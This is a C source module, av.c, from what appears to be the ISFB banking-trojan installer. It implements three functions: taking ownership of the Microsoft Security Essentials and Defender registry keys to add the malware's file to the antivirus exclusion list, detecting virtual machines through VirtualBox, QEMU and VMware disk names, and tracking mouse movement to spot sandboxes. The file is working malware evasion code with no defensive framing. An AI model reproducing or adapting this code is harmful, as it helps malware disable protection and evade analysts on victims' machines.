//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: av.c
// $Revision: 434 $
// $Date: 2014-12-08 14:47:26 +0300 (Пн, 08 дек 2014) $
// description:
//	ISFB client installer.
//	This module implemets some AV detect algos.

#include "common\common.h"
#include <Setupapi.h>
#include <aclapi.h>
#include "common\enumdisk.h"
#include "config.h"


static	POINT	g_Point = {0};

// ---- MSSE and Defender exclusions ---------------------------------------------------------------------------------------------------

#ifdef _MSSE_EXCLUSION

//
//	Adds the specified file path to the exclusions list within the specified registry key.
//
static WINERROR MsseAddExclusion(
	LPTSTR	pFilePath,
	LPTSTR	pRegKey
	)
{
	WINERROR Status = NO_ERROR;
	PACL	pDACL;
	HKEY	hKeyRead, hKeyWrite;
	ACCESS_MASK	Wow64Mask = 0;

#ifndef	_WIN64
	if (g_CurrentProcessFlags & GF_WOW64_PROCESS)
		Wow64Mask = KEY_WOW64_64KEY;
#endif
	
	if ((Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, StrChr(pRegKey, '\\') + 1, 0, Wow64Mask | KEY_READ, &hKeyRead)) == NO_ERROR)
	{
		if ((Status = GetSecurityInfo(hKeyRead, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, &pDACL, NULL, NULL)) == NO_ERROR)
		{
			if ((Status = LsaTakeOwnership(hKeyRead, SE_REGISTRY_KEY)) == NO_ERROR)
			{
				if ((Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, StrChr(pRegKey, '\\') + 1, 0, Wow64Mask | KEY_READ | KEY_WRITE, &hKeyWrite)) == NO_ERROR)
				{
					DWORD Value = 0;

					Status = RegSetValueEx(hKeyWrite, pFilePath, 0, REG_DWORD, (BYTE*)&Value, sizeof(DWORD));
					RegCloseKey(hKeyWrite);
				}
				else
				{
					DbgPrint("ISFB: Unable to open a key to write it\n");
				}
				Status = SetNamedSecurityInfo(pRegKey,  SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, pDACL, NULL);
			}	// if ((Status = LsaTakeOwnership(
		}	// if ((Status = GetSecurityInfo(...

		RegCloseKey(hKeyRead);
	}	// if ((Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, StrChr(szDefenderKey, '\\') + 1, 0, KEY_READ, &hKeyRead)) == NO_ERROR)

	DbgPrint("ISFB: MsseAddExclusion() done with status %u\n", Status);

	return(Status);
}


static WINERROR MsseExcludeFile(
	LPTSTR	pFilePath
	)
{
	WINERROR Status;

	if ((Status = MsseAddExclusion(pFilePath, szMsSeKey)) != NO_ERROR)
	{
		if ((Status = MsseAddExclusion(pFilePath, szDefenderKey)) == NO_ERROR)
		{
			DbgPrint("ISFB: File \"%s\" excluded from Defender check paths.\n", pFilePath);
		}
	}
	else
	{
		DbgPrint("ISFB: File \"%s\" excluded from MSSE check paths.\n", pFilePath);
	}

	return(Status);
}



//
//	Adds the specified file path to MSSE and Defender exclusion list.
//	Requires Administrator privileges.
//
WINERROR AvAddMsseExclusion(
	LPTSTR	pFilePath,	// target file path
	BOOL	bIs64		// TRUE if this is a 64-bit module stored without WOW64 redirection
	)
{
	WINERROR Status;

	if (!bIs64 && (g_CurrentProcessFlags & GF_WOW64_PROCESS))
	{
		LPTSTR	pWow64Path;

		if (pWow64Path = PsSupGetRealFilePath(pFilePath))
		{
			Status = MsseExcludeFile(pWow64Path);
			AppFree(pWow64Path);
		}
		else
			Status = ERROR_NOT_ENOUGH_MEMORY;
	}
	else
		Status = MsseExcludeFile(pFilePath);

	return(Status);
}

#endif	// _MSSE_EXCLUSION


// ---- VM detect --------------------------------------------------------------------------------------------------------------------------

#ifdef _CHECK_VM

//
//	Checks hard drive device name to detect one of known VM hard drives.
//
static BOOL AvIsVmHd(VOID)
{
	HDEVINFO hDevInfo;
	ULONG	Type, Size = 0;
	BOOL	bRet = FALSE;
	LPTSTR	pDeviceName;
	GUID Guid = GUID_DEVCLASS_DISKDRIVE;

	hDevInfo = SetupDiGetClassDevs(&Guid, NULL, NULL, DIGCF_PRESENT);
	if (hDevInfo != INVALID_HANDLE_VALUE)
	{
		SP_DEVINFO_DATA DevInfo;
		DevInfo.cbSize = sizeof(SP_DEVINFO_DATA);

		if (SetupDiEnumDeviceInfo(hDevInfo, 0 ,&DevInfo))
		{
			SetupDiGetDeviceRegistryPropertyA(hDevInfo, &DevInfo, SPDRP_FRIENDLYNAME, &Type, NULL, 0, &Size);
			if (Size && (pDeviceName = AppAlloc(Size)))
			{
				if (SetupDiGetDeviceRegistryPropertyA(hDevInfo, &DevInfo, SPDRP_FRIENDLYNAME, &Type, pDeviceName, Size, &Size))
				{
					if (StrStrI(pDeviceName, szVbox) ||
						StrStrI(pDeviceName, szQemu) ||
						StrStrI(pDeviceName, szVmware) ||
						StrStrI(pDeviceName, szVirtualHd))
						bRet = TRUE;
				}
				AppFree(pDeviceName);
			}	// if (Size && (pDeviceName = AppAlloc(Size)))
		}	// if (SetupDiEnumDeviceInfo(hDevInfo, 0 ,&DevInfo))
		SetupDiDestroyDeviceInfoList(hDevInfo);
	}	// if (hDevInfo != INVALID_HANDLE_VALUE)
	return(bRet);
}


//
//	Returns TRUE if we are running on a VM and there's no special file exists.
//
BOOL AvIsVm(VOID)
{
	HANDLE	hFile;
	BOOL	bRet = TRUE;
	ULONG	BytesRead;

	hFile = CreateFile(szAvFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		if (ReadFile(hFile, (PCHAR)&bRet, sizeof(BOOL), &BytesRead, NULL))
			bRet = FALSE;
		CloseHandle(hFile);
	}
	
	if (bRet)
		bRet = AvIsVmHd();

	return(bRet);
}

#endif	//	_CHECK_VM


#ifdef _WAIT_USER_INPUT

//
//	Returns mouse cursor position relative to previously saved coordinates.
//
ULONG	AvGetCursorMovement(VOID)
{
	POINT	Point;
	ULONG	Movement = 0;

	GetCursorPos(&Point);

	if (g_Point.x && g_Point.y)
		Movement = Point.x - g_Point.y + ((Point.y - g_Point.y) << 16);

	g_Point.x = Point.x;
	g_Point.y = Point.y;

	return(Movement);
}

#endif	// _WAIT_USER_INPUT